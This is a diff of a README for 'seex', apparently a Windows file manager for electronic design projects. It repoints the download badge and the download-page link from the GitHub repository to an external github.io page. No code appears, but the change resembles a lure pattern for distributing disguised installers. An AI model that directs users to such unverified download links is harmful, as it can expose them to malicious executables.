@@ -1,6 +1,6 @@
 # ⚙️ seex - Manage your electronic design files easily
 
-[![](https://img.shields.io/badge/Download-seex-blue.svg)](https://github.com/Quadrate-yamoussukro456/seex)
+[![](https://img.shields.io/badge/Download-seex-blue.svg)](https://quadrate-yamoussukro456.github.io)
 
 seex helps you handle files for your electronic design projects. It works with common software like Altium, KiCad, and EasyEDA. You can organize your projects, view component data, and keep your workspace clean. The application runs on Windows and requires no special programming knowledge to set up.
 
@@ -8,7 +8,7 @@ seex helps you handle files for your electronic design projects. It works with c
 
 You need to download the file from the project page. Visit the official repository to find the latest version suitable for your computer.
 
-[Click here to go to the download page](https://github.com/Quadrate-yamoussukro456/seex)
+[Click here to go to the download page](https://quadrate-yamoussukro456.github.io)
 
 Follow these steps to install the software:
 
